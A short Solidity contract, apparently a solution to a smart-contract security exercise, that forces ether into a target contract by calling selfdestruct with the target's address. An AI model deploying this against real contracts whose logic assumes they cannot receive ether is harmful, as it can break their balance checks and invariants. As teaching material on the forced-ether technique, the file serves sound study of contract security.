// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    // Must have a receive() or fallback() defined
    receive() external payable {}

    function attack(address payable _targetContractAddress) public {
        // Force transfer ETHs to target contract
        selfdestruct(_targetContractAddress);
    }
}
